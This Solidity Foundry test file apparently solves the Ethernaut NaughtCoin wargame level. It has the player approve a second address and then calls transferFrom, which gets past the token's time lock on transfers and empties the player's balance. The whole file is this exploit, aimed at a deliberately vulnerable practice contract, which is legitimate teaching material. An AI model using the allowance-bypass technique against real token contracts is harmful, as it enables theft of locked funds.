// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";
import {NaughtCoin} from "./NaughtCoin.sol";
import "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";

contract NaughtCoinTest is Test {
    NaughtCoin public naught;
    address player;

    function setUp() public {
        vm.warp(1);
        player = address(0x1);
        naught = new NaughtCoin(player);
    }

    function test_Attack_Naught_Coin() public {
        vm.prank(player);
        naught.approve(address(this), 1_000_000 * 10e17);
        naught.transferFrom(player, address(this), 1_000_000 * 10e17);
        assert(naught.balanceOf(player) == 0);
    }
}